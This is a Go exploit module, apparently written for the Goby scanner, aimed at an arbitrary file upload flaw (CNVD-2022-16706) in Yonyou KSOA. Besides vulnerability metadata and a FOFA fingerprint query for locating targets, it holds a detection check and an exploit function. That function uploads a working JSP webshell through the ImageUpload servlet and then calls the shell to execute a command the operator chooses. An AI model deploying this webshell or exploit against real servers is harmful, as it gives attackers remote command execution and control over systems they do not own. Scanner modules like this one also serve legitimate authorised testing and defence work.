package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Yonyou ksoa Arbitrary File Upload Vulnerability",
    "Description": "<p>yonyou ksoa is a new generation product developed under the guidance of SOA concept. It is a unified IT infrastructure launched according to the cutting-edge it needs of circulation enterprises. It can make it systems established by circulation enterprises in various periods easy to talk to each other, help circulation enterprises protect their original IT investment, simplify it management, improve competitiveness, and ensure the realization of the overall strategic objectives and innovation activities of the enterprise. </p><p>Yonyou ksoa has an arbitrary file upload vulnerability, which allows attackers to upload arbitrary files, obtain webshell, control server permissions, read sensitive information, etc.</p>",
    "Product": "yonyou-KSOA",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2022-03-17",
    "Author": "by047",
    "FofaQuery": "body=\"onmouseout=\\\"this.classname='btn btnOff'\\\"\"",
    "GobyQuery": "body=\"onmouseout=\\\"this.classname='btn btnOff'\\\"\"",
    "Level": "3",
    "Impact": "<p>Yonyou ksoa has an arbitrary file upload vulnerability, which allows attackers to upload arbitrary files, obtain webshell, control server permissions, read sensitive information, etc.</p>",
    "Recommendation": "<p>At present, the official has not released a security patch, please pay attention to the manufacturer's update.<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [
        "CNVD-2022-16706"
    ],
    "CVSSScore": "9.9",
    "Translation": {
        "CN": {
            "Name": "用友 KSOA 任意文件上传漏洞",
            "Product": "用友-时空KSOA",
            "Description": "<p>用友时空 KSOA 是建立在SOA理念指导下研发的新一代产品，是根据流通企业最前沿的IT需求推出的统一的IT基础架构，它可以让流通企业各个时期建立的IT系统之间彼此轻松对话，帮助流通企业保护原有的IT投资，简化IT管理，提升竞争能力，确保企业整体的战略目标以及创新活动的实现。<br></p><p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">用友时空 KSOA 存在任意文件上传漏洞，攻击者可以上传任意文件，获取 webshell，控制服务器权限，读取敏感信息等。</span><br></p>",
            "Recommendation": "<p>目前官方尚未发布安全补丁，请关注厂商更新。<a href=\"https://www.yonyou.com/\" target=\"_blank\">https://www.yonyou.com/</a><br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">用友时空 KSOA 存在任意文件上传漏洞，攻击者可以上传任意文件，获取 webshell，控制服务器权限，读取敏感信息等。</span><br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Yonyou ksoa Arbitrary File Upload Vulnerability",
            "Product": "yonyou-KSOA",
            "Description": "<p>yonyou&nbsp;ksoa is a new generation product developed under the guidance of SOA concept. It is a unified IT infrastructure launched according to the cutting-edge it needs of circulation enterprises. It can make it systems established by circulation enterprises in various periods easy to talk to each other, help circulation enterprises protect their original IT investment, simplify it management, improve competitiveness, and ensure the realization of the overall strategic objectives and innovation activities of the enterprise.&nbsp;</p><p><span style=\"color: var(--primaryFont-color);\">Yonyou ksoa has an arbitrary file upload vulnerability, which allows attackers to upload arbitrary files, obtain webshell, control server permissions, read sensitive information, etc.</span><br></p>",
            "Recommendation": "<p>At present, the official has not released a security patch, please pay attention to the manufacturer's update.<a href=\"https://www.yonyou.com/\" target=\"_blank\">https://www.yonyou.com/</a><br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">Yonyou ksoa has an arbitrary file upload vulnerability, which allows attackers to upload arbitrary files, obtain webshell, control server permissions, read sensitive information, etc.</span><br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10692"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 生成随机文件路径用于漏洞检出
			rand1 := goutils.RandomHexString(6)
			rand2 := goutils.RandomHexString(6)

			cfg := httpclient.NewGetRequestConfig("/servlet/com.sksoft.bill.ImageUpload?filepath=" + rand1 + "&filename=" + rand2 + ".jsp")
			cfg.FollowRedirect = false
			cfg.Timeout = 15

			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "<root>/pictures/"+rand1+"/"+rand2+".jsp</root>") {
					return true
				}
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			cmd := ss.Params["cmd"].(string)

			// 上传命令执行 webshell 至 test/test.jsp
			cfg := httpclient.NewPostRequestConfig("/servlet/com.sksoft.bill.ImageUpload?filepath=test&filename=test.jsp")
			cfg.FollowRedirect = false
			cfg.Timeout = 15
			cfg.Data = "<%\n java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream();\n        int a = -1;\n        byte[] b = new byte[2048];\n        out.print(\"<pre>\");\n        while((a=in.read(b))!=-1){\n            out.println(new String(b));\n        }\n        out.print(\"</pre>\");\n%>"

			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "pictures/test/test.jsp") {

					// 访问 shell jsp 执行命令
					cfg2 := httpclient.NewGetRequestConfig("/pictures/test/test.jsp?cmd=" + cmd)
					cfg2.FollowRedirect = false
					cfg2.Timeout = 15

					if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
						if resp2.StatusCode == 200 {
							expResult.Success = true
							expResult.Output = resp2.Utf8Html
						}
					}
				}
			}

			return expResult
		},
	))
}
